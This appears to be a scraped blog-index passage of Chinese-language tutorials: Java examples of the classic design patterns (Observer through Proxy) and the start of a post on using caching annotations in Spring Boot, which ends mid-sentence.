public void notifyObserver() &#123; for (Observer o : observers) &#123; o.update(temperature, humidity, pressure); &#125; &#125;&#125; 123public interface Observer &#123; void update(float temp, float humidity, float pressure);&#125; 1234567891011public class StatisticsDisplay implements Observer &#123; public StatisticsDisplay(Subject weatherData) &#123; weatherData.reisterObserver(this); &#125; @Override public void update(float temp, float humidity, float pressure) &#123; System.out.println("StatisticsDisplay.update: " + temp + " " + humidity + " " + pressure); &#125;&#125; 1234567891011public class CurrentConditionsDisplay implements Observer &#123; public CurrentConditionsDisplay(Subject weatherData) &#123; weatherData.registerObserver(this); &#125; @Override public void update(float temp, float humidity, float pressure) &#123; System.out.println("CurrentConditionsDisplay.update: " + temp + " " + humidity + " " + pressure); &#125;&#125; 12345678910public class WeatherStation &#123; public static void main(String[] args) &#123; WeatherData weatherData = new WeatherData(); CurrentConditionsDisplay currentConditionsDisplay = new CurrentConditionsDisplay(weatherData); StatisticsDisplay statisticsDisplay = new StatisticsDisplay(weatherData); weatherData.setMeasurements(0, 0, 0); weatherData.setMeasurements(1, 1, 1); &#125;&#125; 1234CurrentConditionsDisplay.update: 0.0 0.0 0.0StatisticsDisplay.update: 0.0 0.0 0.0CurrentConditionsDisplay.update: 1.0 1.0 1.0StatisticsDisplay.update: 1.0 1.0 1.0 JDK java.util.Observer java.util.EventListener javax.servlet.http.HttpSessionBindingListener RxJava 8. 状态（State）Intent允许对象在内部状态改变时改变它的行为，对象看起来好像修改了它所属的类。 Class Diagram Implementation糖果销售机有多种状态，每种状态下销售机有不同的行为，状态可以发生转移，使得销售机的行为也发生改变。 123456789101112131415161718192021public interface State &#123; /** * 投入 25 分钱 */ void insertQuarter(); /** * 退回 25 分钱 */ void ejectQuarter(); /** * 转动曲柄 */ void turnCrank(); /** * 发放糖果 */ void dispense();&#125; 123456789101112131415161718192021222324252627282930public class HasQuarterState implements State &#123; private GumballMachine gumballMachine; public HasQuarterState(GumballMachine gumballMachine) &#123; this.gumballMachine = gumballMachine; &#125; @Override public void insertQuarter() &#123; System.out.println("You can't insert another quarter"); &#125; @Override public void ejectQuarter() &#123; System.out.println("Quarter returned"); gumballMachine.setState(gumballMachine.getNoQuarterState()); &#125; @Override public void turnCrank() &#123; System.out.println("You turned..."); gumballMachine.setState(gumballMachine.getSoldState()); &#125; @Override public void dispense() &#123; System.out.println("No gumball dispensed"); &#125;&#125; 1234567891011121314151617181920212223242526272829public class NoQuarterState implements State &#123; GumballMachine gumballMachine; public NoQuarterState(GumballMachine gumballMachine) &#123; this.gumballMachine = gumballMachine; &#125; @Override public void insertQuarter() &#123; System.out.println("You insert a quarter"); gumballMachine.setState(gumballMachine.getHasQuarterState()); &#125; @Override public void ejectQuarter() &#123; System.out.println("You haven't insert a quarter"); &#125; @Override public void turnCrank() &#123; System.out.println("You turned, but there's no quarter"); &#125; @Override public void dispense() &#123; System.out.println("You need to pay first"); &#125;&#125; 12345678910111213141516171819202122232425262728public class SoldOutState implements State &#123; GumballMachine gumballMachine; public SoldOutState(GumballMachine gumballMachine) &#123; this.gumballMachine = gumballMachine; &#125; @Override public void insertQuarter() &#123; System.out.println("You can't insert a quarter, the machine is sold out"); &#125; @Override public void ejectQuarter() &#123; System.out.println("You can't eject, you haven't inserted a quarter yet"); &#125; @Override public void turnCrank() &#123; System.out.println("You turned, but there are no gumballs"); &#125; @Override public void dispense() &#123; System.out.println("No gumball dispensed"); &#125;&#125; 12345678910111213141516171819202122232425262728293031323334public class SoldState implements State &#123; GumballMachine gumballMachine; public SoldState(GumballMachine gumballMachine) &#123; this.gumballMachine = gumballMachine; &#125; @Override public void insertQuarter() &#123; System.out.println("Please wait, we're already giving you a gumball"); &#125; @Override public void ejectQuarter() &#123; System.out.println("Sorry, you already turned the crank"); &#125; @Override public void turnCrank() &#123; System.out.println("Turning twice doesn't get you another gumball!"); &#125; @Override public void dispense() &#123; gumballMachine.releaseBall(); if (gumballMachine.getCount() &gt; 0) &#123; gumballMachine.setState(gumballMachine.getNoQuarterState()); &#125; else &#123; System.out.println("Oops, out of gumballs"); gumballMachine.setState(gumballMachine.getSoldOutState()); &#125; &#125;&#125; 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768public class GumballMachine &#123; private State soldOutState; private State noQuarterState; private State hasQuarterState; private State soldState; private State state; private int count = 0; public GumballMachine(int numberGumballs) &#123; count = numberGumballs; soldOutState = new SoldOutState(this); noQuarterState = new NoQuarterState(this); hasQuarterState = new HasQuarterState(this); soldState = new SoldState(this); if (numberGumballs &gt; 0) &#123; state = noQuarterState; &#125; else &#123; state = soldOutState; &#125; &#125; public void insertQuarter() &#123; state.insertQuarter(); &#125; public void ejectQuarter() &#123; state.ejectQuarter(); &#125; public void turnCrank() &#123; state.turnCrank(); state.dispense(); &#125; public void setState(State state) &#123; this.state = state; &#125; public void releaseBall() &#123; System.out.println("A gumball comes rolling out the slot..."); if (count != 0) &#123; count -= 1; &#125; &#125; public State getSoldOutState() &#123; return soldOutState; &#125; public State getNoQuarterState() &#123; return noQuarterState; &#125; public State getHasQuarterState() &#123; return hasQuarterState; &#125; public State getSoldState() &#123; return soldState; &#125; public int getCount() &#123; return count; &#125;&#125; 123456789101112131415161718192021222324252627public class Client &#123; public static void main(String[] args) &#123; GumballMachine gumballMachine = new GumballMachine(5); gumballMachine.insertQuarter(); gumballMachine.turnCrank(); gumballMachine.insertQuarter(); gumballMachine.ejectQuarter(); gumballMachine.turnCrank(); gumballMachine.insertQuarter(); gumballMachine.turnCrank(); gumballMachine.insertQuarter(); gumballMachine.turnCrank(); gumballMachine.ejectQuarter(); gumballMachine.insertQuarter(); gumballMachine.insertQuarter(); gumballMachine.turnCrank(); gumballMachine.insertQuarter(); gumballMachine.turnCrank(); gumballMachine.insertQuarter(); gumballMachine.turnCrank(); &#125;&#125; 12345678910111213141516171819202122232425You insert a quarterYou turned...A gumball comes rolling out the slot...You insert a quarterQuarter returnedYou turned, but there's no quarterYou need to pay firstYou insert a quarterYou turned...A gumball comes rolling out the slot...You insert a quarterYou turned...A gumball comes rolling out the slot...You haven't insert a quarterYou insert a quarterYou can't insert another quarterYou turned...A gumball comes rolling out the slot...You insert a quarterYou turned...A gumball comes rolling out the slot...Oops, out of gumballsYou can't insert a quarter, the machine is sold outYou turned, but there are no gumballsNo gumball dispensed 9. 策略（Strategy）Intent定义一系列算法，封装每个算法，并使它们可以互换。 策略模式可以让算法独立于使用它的客户端。 Class Diagram Strategy 接口定义了一个算法族，它们都实现了 behavior() 方法。 Context 是使用到该算法族的类，其中的 doSomething() 方法会调用 behavior()，setStrategy(Strategy) 方法可以动态地改变 strategy 对象，也就是说能动态地改变 Context 所使用的算法。 与状态模式的比较状态模式的类图和策略模式类似，并且都是能够动态改变对象的行为。但是状态模式是通过状态转移来改变 Context 所组合的 State 对象，而策略模式是通过 Context 本身的决策来改变组合的 Strategy 对象。所谓的状态转移，是指 Context 在运行过程中由于一些条件发生改变而使得 State 对象发生改变，注意必须要是在运行过程中。 状态模式主要是用来解决状态转移的问题，当状态发生转移了，那么 Context 对象就会改变它的行为；而策略模式主要是用来封装一组可以互相替代的算法族，并且可以根据需要动态地去替换 Context 使用的算法。 Implementation设计一个鸭子，它可以动态地改变叫声。这里的算法族是鸭子的叫声行为。 123public interface QuackBehavior &#123; void quack();&#125; 123456public class Quack implements QuackBehavior &#123; @Override public void quack() &#123; System.out.println("quack!"); &#125;&#125; 123456public class Squeak implements QuackBehavior&#123; @Override public void quack() &#123; System.out.println("squeak!"); &#125;&#125; 1234567891011121314public class Duck &#123; private QuackBehavior quackBehavior; public void performQuack() &#123; if (quackBehavior != null) &#123; quackBehavior.quack(); &#125; &#125; public void setQuackBehavior(QuackBehavior quackBehavior) &#123; this.quackBehavior = quackBehavior; &#125;&#125; 12345678910public class Client &#123; public static void main(String[] args) &#123; Duck duck = new Duck(); duck.setQuackBehavior(new Squeak()); duck.performQuack(); duck.setQuackBehavior(new Quack()); duck.performQuack(); &#125;&#125; 12squeak!quack! JDK java.util.Comparator#compare() javax.servlet.http.HttpServlet javax.servlet.Filter#doFilter() 10. 模板方法（Template Method）Intent定义算法框架，并将一些步骤的实现延迟到子类。 通过模板方法，子类可以重新定义算法的某些步骤，而不用改变算法的结构。 Class Diagram Implementation冲咖啡和冲茶都有类似的流程，但是某些步骤会有点不一样，要求复用那些相同步骤的代码。 123456789101112131415161718192021public abstract class CaffeineBeverage &#123; final void prepareRecipe() &#123; boilWater(); brew(); pourInCup(); addCondiments(); &#125; abstract void brew(); abstract void addCondiments(); void boilWater() &#123; System.out.println("boilWater"); &#125; void pourInCup() &#123; System.out.println("pourInCup"); &#125;&#125; 1234567891011public class Coffee extends CaffeineBeverage &#123; @Override void brew() &#123; System.out.println("Coffee.brew"); &#125; @Override void addCondiments() &#123; System.out.println("Coffee.addCondiments"); &#125;&#125; 1234567891011public class Tea extends CaffeineBeverage &#123; @Override void brew() &#123; System.out.println("Tea.brew"); &#125; @Override void addCondiments() &#123; System.out.println("Tea.addCondiments"); &#125;&#125; 123456789public class Client &#123; public static void main(String[] args) &#123; CaffeineBeverage caffeineBeverage = new Coffee(); caffeineBeverage.prepareRecipe(); System.out.println("-----------"); caffeineBeverage = new Tea(); caffeineBeverage.prepareRecipe(); &#125;&#125; 123456789boilWaterCoffee.brewpourInCupCoffee.addCondiments-----------boilWaterTea.brewpourInCupTea.addCondiments JDK java.util.Collections#sort() java.io.InputStream#skip() java.io.InputStream#read() java.util.AbstractList#indexOf() 11. 访问者（Visitor）Intent为一个对象结构（比如组合结构）增加新能力。 Class Diagram Visitor：访问者，为每一个 ConcreteElement 声明一个 visit 操作 ConcreteVisitor：具体访问者，存储遍历过程中的累计结果 ObjectStructure：对象结构，可以是组合结构，或者是一个集合。 Implementation123public interface Element &#123; void accept(Visitor visitor);&#125; 1234567891011121314class CustomerGroup &#123; private List&lt;Customer&gt; customers = new ArrayList&lt;&gt;(); void accept(Visitor visitor) &#123; for (Customer customer : customers) &#123; customer.accept(visitor); &#125; &#125; void addCustomer(Customer customer) &#123; customers.add(customer); &#125;&#125; 123456789101112131415161718192021222324public class Customer implements Element &#123; private String name; private List&lt;Order&gt; orders = new ArrayList&lt;&gt;(); Customer(String name) &#123; this.name = name; &#125; String getName() &#123; return name; &#125; void addOrder(Order order) &#123; orders.add(order); &#125; public void accept(Visitor visitor) &#123; visitor.visit(this); for (Order order : orders) &#123; order.accept(visitor); &#125; &#125;&#125; 123456789101112131415161718192021222324252627282930public class Order implements Element &#123; private String name; private List&lt;Item&gt; items = new ArrayList(); Order(String name) &#123; this.name = name; &#125; Order(String name, String itemName) &#123; this.name = name; this.addItem(new Item(itemName)); &#125; String getName() &#123; return name; &#125; void addItem(Item item) &#123; items.add(item); &#125; public void accept(Visitor visitor) &#123; visitor.visit(this); for (Item item : items) &#123; item.accept(visitor); &#125; &#125;&#125; 12345678910111213141516public class Item implements Element &#123; private String name; Item(String name) &#123; this.name = name; &#125; String getName() &#123; return name; &#125; public void accept(Visitor visitor) &#123; visitor.visit(this); &#125;&#125; 1234567public interface Visitor &#123; void visit(Customer customer); void visit(Order order); void visit(Item item);&#125; 123456789101112131415161718192021222324252627public class GeneralReport implements Visitor &#123; private int customersNo; private int ordersNo; private int itemsNo; public void visit(Customer customer) &#123; System.out.println(customer.getName()); customersNo++; &#125; public void visit(Order order) &#123; System.out.println(order.getName()); ordersNo++; &#125; public void visit(Item item) &#123; System.out.println(item.getName()); itemsNo++; &#125; public void displayResults() &#123; System.out.println("Number of customers: " + customersNo); System.out.println("Number of orders: " + ordersNo); System.out.println("Number of items: " + itemsNo); &#125;&#125; 1234567891011121314151617181920212223public class Client &#123; public static void main(String[] args) &#123; Customer customer1 = new Customer("customer1"); customer1.addOrder(new Order("order1", "item1")); customer1.addOrder(new Order("order2", "item1")); customer1.addOrder(new Order("order3", "item1")); Order order = new Order("order_a"); order.addItem(new Item("item_a1")); order.addItem(new Item("item_a2")); order.addItem(new Item("item_a3")); Customer customer2 = new Customer("customer2"); customer2.addOrder(order); CustomerGroup customers = new CustomerGroup(); customers.addCustomer(customer1); customers.addCustomer(customer2); GeneralReport visitor = new GeneralReport(); customers.accept(visitor); visitor.displayResults(); &#125;&#125; 123456789101112131415customer1order1item1order2item1order3item1customer2order_aitem_a1item_a2item_a3Number of customers: 2Number of orders: 4Number of items: 6 JDK javax.lang.model.element.Element and javax.lang.model.element.ElementVisitor javax.lang.model.type.TypeMirror and javax.lang.model.type.TypeVisitor 12. 空对象（Null）Intent使用什么都不做的空对象来代替 NULL。 一个方法返回 NULL，意味着方法的调用端需要去检查返回值是否是 NULL，这么做会导致非常多的冗余的检查代码。并且如果某一个调用端忘记了做这个检查返回值，而直接使用返回的对象，那么就有可能抛出空指针异常。 Class Diagram Implementation123public abstract class AbstractOperation &#123; abstract void request();&#125; 123456public class RealOperation extends AbstractOperation &#123; @Override void request() &#123; System.out.println("do something"); &#125;&#125; 123456public class NullOperation extends AbstractOperation&#123; @Override void request() &#123; // do nothing &#125;&#125; 12345678910111213public class Client &#123; public static void main(String[] args) &#123; AbstractOperation abstractOperation = func(-1); abstractOperation.request(); &#125; public static AbstractOperation func(int para) &#123; if (para &lt; 0) &#123; return new NullOperation(); &#125; return new RealOperation(); &#125;&#125; 四、结构型1. 适配器（Adapter）Intent把一个类接口转换成另一个用户需要的接口。 Class Diagram Implementation鸭子（Duck）和火鸡（Turkey）拥有不同的叫声，Duck 的叫声调用 quack() 方法，而 Turkey 调用 gobble() 方法。 要求将 Turkey 的 gobble() 方法适配成 Duck 的 quack() 方法，从而让火鸡冒充鸭子！ 123public interface Duck &#123; void quack();&#125; 123public interface Turkey &#123; void gobble();&#125; 123456public class WildTurkey implements Turkey &#123; @Override public void gobble() &#123; System.out.println("gobble!"); &#125;&#125; 123456789101112public class TurkeyAdapter implements Duck &#123; Turkey turkey; public TurkeyAdapter(Turkey turkey) &#123; this.turkey = turkey; &#125; @Override public void quack() &#123; turkey.gobble(); &#125;&#125; 1234567public class Client &#123; public static void main(String[] args) &#123; Turkey turkey = new WildTurkey(); Duck duck = new TurkeyAdapter(turkey); duck.quack(); &#125;&#125; JDK java.util.Arrays#asList() java.util.Collections#list() java.util.Collections#enumeration() javax.xml.bind.annotation.adapters.XMLAdapter 2. 桥接（Bridge）Intent将抽象与实现分离开来，使它们可以独立变化。 Class Diagram Abstraction：定义抽象类的接口 Implementor：定义实现类接口 ImplementationRemoteControl 表示遥控器，指代 Abstraction。 TV 表示电视，指代 Implementor。 桥接模式将遥控器和电视分离开来，从而可以独立改变遥控器或者电视的实现。 1234567public abstract class TV &#123; public abstract void on(); public abstract void off(); public abstract void tuneChannel();&#125; 12345678910111213141516public class Sony extends TV &#123; @Override public void on() &#123; System.out.println("Sony.on()"); &#125; @Override public void off() &#123; System.out.println("Sony.off()"); &#125; @Override public void tuneChannel() &#123; System.out.println("Sony.tuneChannel()"); &#125;&#125; 12345678910111213141516public class RCA extends TV &#123; @Override public void on() &#123; System.out.println("RCA.on()"); &#125; @Override public void off() &#123; System.out.println("RCA.off()"); &#125; @Override public void tuneChannel() &#123; System.out.println("RCA.tuneChannel()"); &#125;&#125; 12345678910111213public abstract class RemoteControl &#123; protected TV tv; public RemoteControl(TV tv) &#123; this.tv = tv; &#125; public abstract void on(); public abstract void off(); public abstract void tuneChannel();&#125; 1234567891011121314151617181920212223public class ConcreteRemoteControl1 extends RemoteControl &#123; public ConcreteRemoteControl1(TV tv) &#123; super(tv); &#125; @Override public void on() &#123; System.out.println("ConcreteRemoteControl1.on()"); tv.on(); &#125; @Override public void off() &#123; System.out.println("ConcreteRemoteControl1.off()"); tv.off(); &#125; @Override public void tuneChannel() &#123; System.out.println("ConcreteRemoteControl1.tuneChannel()"); tv.tuneChannel(); &#125;&#125; 1234567891011121314151617181920212223public class ConcreteRemoteControl2 extends RemoteControl &#123; public ConcreteRemoteControl2(TV tv) &#123; super(tv); &#125; @Override public void on() &#123; System.out.println("ConcreteRemoteControl2.on()"); tv.on(); &#125; @Override public void off() &#123; System.out.println("ConcreteRemoteControl2.off()"); tv.off(); &#125; @Override public void tuneChannel() &#123; System.out.println("ConcreteRemoteControl2.tuneChannel()"); tv.tuneChannel(); &#125;&#125; 123456789101112public class Client &#123; public static void main(String[] args) &#123; RemoteControl remoteControl1 = new ConcreteRemoteControl1(new RCA()); remoteControl1.on(); remoteControl1.off(); remoteControl1.tuneChannel(); RemoteControl remoteControl2 = new ConcreteRemoteControl2(new Sony()); remoteControl2.on(); remoteControl2.off(); remoteControl2.tuneChannel(); &#125;&#125; JDK AWT (It provides an abstraction layer which maps onto the native OS the windowing support.) JDBC 3. 组合（Composite）Intent将对象组合成树形结构来表示“整体/部分”层次关系，允许用户以相同的方式处理单独对象和组合对象。 Class Diagram组件（Component）类是组合类（Composite）和叶子类（Leaf）的父类，可以把组合类看成是树的中间节点。 组合对象拥有一个或者多个组件对象，因此组合对象的操作可以委托给组件对象去处理，而组件对象可以是另一个组合对象或者叶子对象。 Implementation1234567891011121314151617public abstract class Component &#123; protected String name; public Component(String name) &#123; this.name = name; &#125; public void print() &#123; print(0); &#125; abstract void print(int level); abstract public void add(Component component); abstract public void remove(Component component);&#125; 123456789101112131415161718192021222324252627282930public class Composite extends Component &#123; private List&lt;Component&gt; child; public Composite(String name) &#123; super(name); child = new ArrayList&lt;&gt;(); &#125; @Override void print(int level) &#123; for (int i = 0; i &lt; level; i++) &#123; System.out.print("--"); &#125; System.out.println("Composite:" + name); for (Component component : child) &#123; component.print(level + 1); &#125; &#125; @Override public void add(Component component) &#123; child.add(component); &#125; @Override public void remove(Component component) &#123; child.remove(component); &#125;&#125; 1234567891011121314151617181920212223public class Leaf extends Component &#123; public Leaf(String name) &#123; super(name); &#125; @Override void print(int level) &#123; for (int i = 0; i &lt; level; i++) &#123; System.out.print("--"); &#125; System.out.println("left:" + name); &#125; @Override public void add(Component component) &#123; throw new UnsupportedOperationException(); // 牺牲透明性换取单一职责原则，这样就不用考虑是叶子节点还是组合节点 &#125; @Override public void remove(Component component) &#123; throw new UnsupportedOperationException(); &#125;&#125; 123456789101112131415161718public class Client &#123; public static void main(String[] args) &#123; Composite root = new Composite("root"); Component node1 = new Leaf("1"); Component node2 = new Composite("2"); Component node3 = new Leaf("3"); root.add(node1); root.add(node2); root.add(node3); Component node21 = new Leaf("21"); Component node22 = new Composite("22"); node2.add(node21); node2.add(node22); Component node221 = new Leaf("221"); node22.add(node221); root.print(); &#125;&#125; 1234567Composite:root--left:1--Composite:2----left:21----Composite:22------left:221--left:3 JDK javax.swing.JComponent#add(Component) java.awt.Container#add(Component) java.util.Map#putAll(Map) java.util.List#addAll(Collection) java.util.Set#addAll(Collection) 4. 装饰（Decorator）Intent为对象动态添加功能。 Class Diagram装饰者（Decorator）和具体组件（ConcreteComponent）都继承自组件（Component），具体组件的方法实现不需要依赖于其它对象，而装饰者组合了一个组件，这样它可以装饰其它装饰者或者具体组件。所谓装饰，就是把这个装饰者套在被装饰者之上，从而动态扩展被装饰者的功能。装饰者的方法有一部分是自己的，这属于它的功能，然后调用被装饰者的方法实现，从而也保留了被装饰者的功能。可以看到，具体组件应当是装饰层次的最低层，因为只有具体组件的方法实现不需要依赖于其它对象。 Implementation设计不同种类的饮料，饮料可以添加配料，比如可以添加牛奶，并且支持动态添加新配料。每增加一种配料，该饮料的价格就会增加，要求计算一种饮料的价格。 下图表示在 DarkRoast 饮料上新增新添加 Mocha 配料，之后又添加了 Whip 配料。DarkRoast 被 Mocha 包裹，Mocha 又被 Whip 包裹。它们都继承自相同父类，都有 cost() 方法，外层类的 cost() 方法调用了内层类的 cost() 方法。 123public interface Beverage &#123; double cost();&#125; 123456public class DarkRoast implements Beverage &#123; @Override public double cost() &#123; return 1; &#125;&#125; 123456public class HouseBlend implements Beverage &#123; @Override public double cost() &#123; return 1; &#125;&#125; 123public abstract class CondimentDecorator implements Beverage &#123; protected Beverage beverage;&#125; 1234567891011public class Milk extends CondimentDecorator &#123; public Milk(Beverage beverage) &#123; this.beverage = beverage; &#125; @Override public double cost() &#123; return 1 + beverage.cost(); &#125;&#125; 1234567891011public class Mocha extends CondimentDecorator &#123; public Mocha(Beverage beverage) &#123; this.beverage = beverage; &#125; @Override public double cost() &#123; return 1 + beverage.cost(); &#125;&#125; 123456789public class Client &#123; public static void main(String[] args) &#123; Beverage beverage = new HouseBlend(); beverage = new Mocha(beverage); beverage = new Milk(beverage); System.out.println(beverage.cost()); &#125;&#125; 13.0 设计原则类应该对扩展开放，对修改关闭：也就是添加新功能时不需要修改代码。饮料可以动态添加新的配料，而不需要去修改饮料的代码。 不可能把所有的类设计成都满足这一原则，应当把该原则应用于最有可能发生改变的地方。 JDK java.io.BufferedInputStream(InputStream) java.io.DataInputStream(InputStream) java.io.BufferedOutputStream(OutputStream) java.util.zip.ZipOutputStream(OutputStream) java.util.Collections#checkedList|Map|Set|SortedSet|SortedMap 5. 外观（Facade）Intent提供了一个统一的接口，用来访问子系统中的一群接口，从而让子系统更容易使用。 Class Diagram Implementation观看电影需要操作很多电器，使用外观模式实现一键看电影功能。 12345678910111213public class SubSystem &#123; public void turnOnTV() &#123; System.out.println("turnOnTV()"); &#125; public void setCD(String cd) &#123; System.out.println("setCD( " + cd + " )"); &#125; public void startWatching()&#123; System.out.println("startWatching()"); &#125;&#125; 123456789public class Facade &#123; private SubSystem subSystem = new SubSystem(); public void watchMovie() &#123; subSystem.turnOnTV(); subSystem.setCD("a movie"); subSystem.startWatching(); &#125;&#125; 123456public class Client &#123; public static void main(String[] args) &#123; Facade facade = new Facade(); facade.watchMovie(); &#125;&#125; 设计原则最少知识原则：只和你的密友谈话。也就是说客户对象所需要交互的对象应当尽可能少。 6. 享元（Flyweight）Intent利用共享的方式来支持大量细粒度的对象，这些对象一部分内部状态是相同的。 Class Diagram Flyweight：享元对象 IntrinsicState：内部状态，享元对象共享内部状态 ExtrinsicState：外部状态，每个享元对象的外部状态不同 Implementation123public interface Flyweight &#123; void doOperation(String extrinsicState);&#125; 123456789101112131415public class ConcreteFlyweight implements Flyweight &#123; private String intrinsicState; public ConcreteFlyweight(String intrinsicState) &#123; this.intrinsicState = intrinsicState; &#125; @Override public void doOperation(String extrinsicState) &#123; System.out.println("Object address: " + System.identityHashCode(this)); System.out.println("IntrinsicState: " + intrinsicState); System.out.println("ExtrinsicState: " + extrinsicState); &#125;&#125; 123456789101112public class FlyweightFactory &#123; private HashMap&lt;String, Flyweight&gt; flyweights = new HashMap&lt;&gt;(); Flyweight getFlyweight(String intrinsicState) &#123; if (!flyweights.containsKey(intrinsicState)) &#123; Flyweight flyweight = new ConcreteFlyweight(intrinsicState); flyweights.put(intrinsicState, flyweight); &#125; return flyweights.get(intrinsicState); &#125;&#125; 12345678910public class Client &#123; public static void main(String[] args) &#123; FlyweightFactory factory = new FlyweightFactory(); Flyweight flyweight1 = factory.getFlyweight("aa"); Flyweight flyweight2 = factory.getFlyweight("aa"); flyweight1.doOperation("x"); flyweight2.doOperation("y"); &#125;&#125; 123456Object address: 1163157884IntrinsicState: aaExtrinsicState: xObject address: 1163157884IntrinsicState: aaExtrinsicState: y JDKJava 利用缓存来加速大量小对象的访问时间。 java.lang.Integer#valueOf(int) java.lang.Boolean#valueOf(boolean) java.lang.Byte#valueOf(byte) java.lang.Character#valueOf(char) 7. 代理（Proxy）Intent控制对其它对象的访问。 Class Diagram代理有以下四类： 远程代理（Remote Proxy）：控制对远程对象（不同地址空间）的访问，它负责将请求及其参数进行编码，并向不同地址空间中的对象发送已经编码的请求。 虚拟代理（Virtual Proxy）：根据需要创建开销很大的对象，它可以缓存实体的附加信息，以便延迟对它的访问，例如在网站加载一个很大图片时，不能马上完成，可以用虚拟代理缓存图片的大小信息，然后生成一张临时图片代替原始图片。 保护代理（Protection Proxy）：按权限控制对象的访问，它负责检查调用者是否具有实现一个请求所必须的访问权限。 智能代理（Smart Reference）：取代了简单的指针，它在访问对象时执行一些附加操作：记录对象的引用次数；当第一次引用一个对象时，将它装入内存；在访问一个实际对象前，检查是否已经锁定了它，以确保其它对象不能改变它。 Implementation以下是一个虚拟代理的实现，模拟了图片延迟加载的情况下使用与图片大小相等的临时内容去替换原始图片，直到图片加载完成才将图片显示出来。 123public interface Image &#123; void showImage();&#125; 123456789101112131415161718192021222324252627282930313233public class HighResolutionImage implements Image &#123; private URL imageURL; private long startTime; private int height; private int width; public int getHeight() &#123; return height; &#125; public int getWidth() &#123; return width; &#125; public HighResolutionImage(URL imageURL) &#123; this.imageURL = imageURL; this.startTime = System.currentTimeMillis(); this.width = 600; this.height = 600; &#125; public boolean isLoad() &#123; // 模拟图片加载，延迟 3s 加载完成 long endTime = System.currentTimeMillis(); return endTime - startTime &gt; 3000; &#125; @Override public void showImage() &#123; System.out.println("Real Image: " + imageURL); &#125;&#125; 123456789101112131415161718192021public class ImageProxy implements Image &#123; private HighResolutionImage highResolutionImage; public ImageProxy(HighResolutionImage highResolutionImage) &#123; this.highResolutionImage = highResolutionImage; &#125; @Override public void showImage() &#123; while (!highResolutionImage.isLoad()) &#123; try &#123; System.out.println("Temp Image: " + highResolutionImage.getWidth() + " " + highResolutionImage.getHeight()); Thread.sleep(100); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; &#125; highResolutionImage.showImage(); &#125;&#125; 12345678910public class ImageViewer &#123; public static void main(String[] args) throws Exception &#123; String image = "http://image.jpg"; URL url = new URL(image); HighResolutionImage highResolutionImage = new HighResolutionImage(url); ImageProxy imageProxy = new ImageProxy(highResolutionImage); imageProxy.showImage(); &#125;&#125; JDK java.lang.reflect.Proxy RMI]]></content>
      <categories>
        <category>面向对象</category>
      </categories>
      <tags>
        <tag>设计模式</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Springboot中使用缓存]]></title>
    <url>%2F2019%2F01%2F03%2FSpringboot%E4%B8%AD%E4%BD%BF%E7%94%A8%E7%BC%93%E5%AD%98%2F</url>
    <content type="text"><![CDATA[在程序中可以使用缓存的技术来节省对数据库的开销。Spring Boot对缓存提供了很好的支持，我们几乎不用做过多的配置即可使用各种缓存实现。这里主要介绍平日里个人接触较多的Ehcache和Redis缓存实现。 准备工作搭建一个Spring Boot项目，然后yml中配置日志输出级别以观察SQL的执行情况： 12345logging: level: com: springboot: mapper: debug 其中com.spring.mapper为MyBatis的Mapper接口路径。 然后编写如下测试方法： 12345678910111213141516@RunWith(SpringJUnit4ClassRunner.class)@SpringBootTest(classes = Application.class)public class ApplicationTest &#123; @Autowired private StudentService studentService; @Test public void test() throws Exception &#123; Student student1 = this.studentService.queryStudentBySno(&quot;001&quot;); System.out.println(&quot;学号&quot; + student1.getSno() + &quot;的学生姓名为：&quot; + student1.getName()); Student student2 = this.studentService.queryStudentBySno(&quot;001&quot;); System.out.println(&quot;学号&quot; + student2.getSno() + &quot;的学生姓名为：&quot; + student2.getName()); &#125;&#125; 右键run as junit test： 123456782017-11-17 16:34:26.535 DEBUG 9932 --- [main] c.s.m.StudentMapper.queryStudentBySno : ==&gt; Preparing: select * from student where sno=? 2017-11-17 16:34:26.688 DEBUG 9932 --- [main] c.s.m.StudentMapper.queryStudentBySno : ==&gt; Parameters: 001(String)2017-11-17 16:34:26.716 DEBUG 9932 --- [main] c.s.m.StudentMapper.queryStudentBySno : &lt;== Total: 1学号001的学生姓名为：KangKang2017-11-17 16:34:26.720 DEBUG 9932 --- [main] c.s.m.StudentMapper.queryStudentBySno : ==&gt; Preparing: select * from student where sno=? 2017-11-17 16:34:26.720 DEBUG 9932 --- [main] c.s.m.StudentMapper.queryStudentBySno : ==&gt; Parameters: 001(String)2017-11-17 16:34:26.721 DEBUG 9932 --- [main] c.s.m.StudentMapper.queryStudentBySno : &lt;== Total: 1学号001的学生姓名为：KangKang 可发现第二个查询虽然和第一个查询完全一样，但其还是对数据库进行了查询。接下来引入缓存来改善这个结果。 使用缓存要开启Spring Boot的缓存功能，需要在pom中引入spring-boot-starter-cache： 1234&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-cache&lt;/artifactId&gt;&lt;/dependency&gt; 接着在Spring Boot入口类中加入@EnableCaching注解开启缓存功能： 1234567@SpringBootApplication@EnableCachingpublic class Application &#123; public static void main(String[] args) &#123; SpringApplication.run(Application.class,args); &#125;&#125; 在StudentService接口中加入缓存注解： 123456789101112@CacheConfig(cacheNames = &quot;student&quot;)@Repositorypublic interface StudentService &#123; @CachePut(key = &quot;#p0.sno&quot;) Student update(Student student); @CacheEvict(key = &quot;#p0&quot;, allEntries = true) void deleteStudentBySno(String sno); @Cacheable(key = &quot;#p0&quot;) Student queryStudentBySno(String sno);&#125; 我们在StudentService接口中加入了@CacheConfig注解，queryStudentBySno方法使用了注解@Cacheable(key=&quot;#p0&quot;)，即将id作为redis中的key值。当我们更新数据的时候，应该使用@CachePut(key=&quot;#p0.sno&quot;)进行缓存数据的更新，否则将查询到脏数据，因为该注解保存的是方法的返回值，所以这里应该返回Student。 其实现类： 123456789101112131415161718192021@Repository(&quot;studentService&quot;)public class StudentServiceImpl implements StudentService&#123; @Autowired private StudentMapper studentMapper; @Override public Student update(Student student) &#123; this.studentMapper.update(student); return this.studentMapper.queryStudentBySno(student.getSno()); &#125; @Override public void deleteStudentBySno(String sno) &#123; this.studentMapper.deleteStudentBySno(sno); &#125; @Override public Student queryStudentBySno(String sno) &#123; return this.studentMapper.queryStudentBySno(sno); &#125;&#125; 在Spring Boot中可使用的缓存注解有： 缓存注解 @CacheConfig：主要用于配置该类中会用到的一些共用的缓存配置。在这里@CacheConfig(cacheNames = 